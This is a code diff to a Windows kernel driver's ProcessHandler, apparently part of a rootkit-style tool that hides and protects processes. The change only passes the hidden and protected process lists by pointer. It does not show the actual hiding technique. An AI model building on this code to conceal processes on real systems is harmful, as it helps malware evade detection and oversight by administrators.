@@ -156,7 +156,7 @@ NTSTATUS ProcessHandler::UnhideProcess(_In_ ULONG pid) {
 	ExReleasePushLockExclusive(listLock);
 	ObDereferenceObject(targetProcess);
 	
-	status = RemoveListEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, entryToRestore) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
+	status = RemoveListEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, entryToRestore) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 
 	return status;
 }
@@ -300,7 +300,7 @@ bool ProcessHandler::ProtectProcess(_In_ ULONG pid) {
 	if (!newEntry)
 		return false;
 	newEntry->Pid = pid;
-	AddEntry<ProcessList, ProtectedProcessEntry>(protectedProcesses, newEntry);
+	AddEntry<ProcessList, ProtectedProcessEntry>(&protectedProcesses, newEntry);
 
 	return true;
 }
@@ -328,7 +328,7 @@ bool ProcessHandler::AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess) {
 		return false;
 	newEntry->Pid = hiddenProcess.Pid;
 	newEntry->OriginalEntry = hiddenProcess.OriginalEntry;
-	AddEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, newEntry);
+	AddEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, newEntry);
 	return true;
 }
 
@@ -354,7 +354,7 @@ bool ProcessHandler::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
 			return item->Pid == pid;
 			};
 		ProtectedProcessEntry* entry = FindListEntry<ProcessList, ProtectedProcessEntry, ULONG>(protectedProcesses, pid, finder);
-		return RemoveListEntry<ProcessList, ProtectedProcessEntry>(protectedProcesses, entry);
+		return RemoveListEntry<ProcessList, ProtectedProcessEntry>(&protectedProcesses, entry);
 	}
 	
 	case ProcessType::Hidden: {
@@ -362,7 +362,7 @@ bool ProcessHandler::RemoveProcess(_In_ ULONG pid, _In_ ProcessType type) {
 			return item->Pid == pid;
 			};
 		HiddenProcessEntry* entry = FindListEntry<ProcessList, HiddenProcessEntry, ULONG>(hiddenProcesses, pid, finder);
-		return RemoveListEntry<ProcessList, HiddenProcessEntry>(hiddenProcesses, entry);
+		return RemoveListEntry<ProcessList, HiddenProcessEntry>(&hiddenProcesses, entry);
 	}
 	default:
 		return false;
@@ -383,14 +383,14 @@ _IRQL_requires_max_(APC_LEVEL)
 void ProcessHandler::ClearProcessList(_In_ ProcessType type) {
 	switch (type) {
 	case ProcessType::Protected:
-		ClearList<ProcessList, ProtectedProcessEntry>(this->protectedProcesses);
+		ClearList<ProcessList, ProtectedProcessEntry>(&this->protectedProcesses);
 		break;
 	case ProcessType::Hidden:
-		ClearList<ProcessList, HiddenProcessEntry>(this->hiddenProcesses);
+		ClearList<ProcessList, HiddenProcessEntry>(&this->hiddenProcesses);
 		break;
 	case ProcessType::All:
-		ClearList<ProcessList, ProtectedProcessEntry>(this->protectedProcesses);
-		ClearList<ProcessList, HiddenProcessEntry>(this->hiddenProcesses);
+		ClearList<ProcessList, ProtectedProcessEntry>(&this->protectedProcesses);
+		ClearList<ProcessList, HiddenProcessEntry>(&this->hiddenProcesses);
 		break;
 	}
 }
